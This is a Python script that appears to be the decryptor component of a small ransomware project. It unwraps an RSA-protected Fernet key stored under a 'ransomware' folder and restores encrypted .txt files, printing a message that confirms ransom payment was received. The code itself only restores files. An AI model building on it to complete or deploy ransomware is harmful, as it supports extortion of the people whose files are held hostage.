import os
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend 
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet


def decrypt(ciphertext: bytes, key: Fernet) -> None:
    return key.decrypt(ciphertext)

def decrypt_key(path: str) -> bytes:
    with open("private_key.pem", "rb") as key_file:
        with open(path, "rb") as keyfile:
            private_key = serialization.load_pem_private_key(
                key_file.read(),
                password=None,
                backend=default_backend()
            )
            key = private_key.decrypt(
                base64.b64decode(keyfile.read()),
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
    return key


def read_key() -> bytes:
    path = os.path.join(os.getenv("LOCALAPPDATA"), "ransomware", "keyfile")
    if not os.path.exists(path):
        raise Exception("This machine is not infected")
    
    return decrypt_key(path)

def decryption():
    key = Fernet(read_key())
    files = os.listdir()
    for file in files:
        if file.endswith(".txt"):
            with open(file,"rb") as f:
                encrypted = f.read()
            with open(file,"wb") as f:
                f.write(decrypt(encrypted, key))

try:
    print("We have received your payment. We will begin decryption of your files.")
    decryption()
    print("Your files has been decrypted successfully")
except Exception as e:
    print("Decryption Failed")
    print(e)
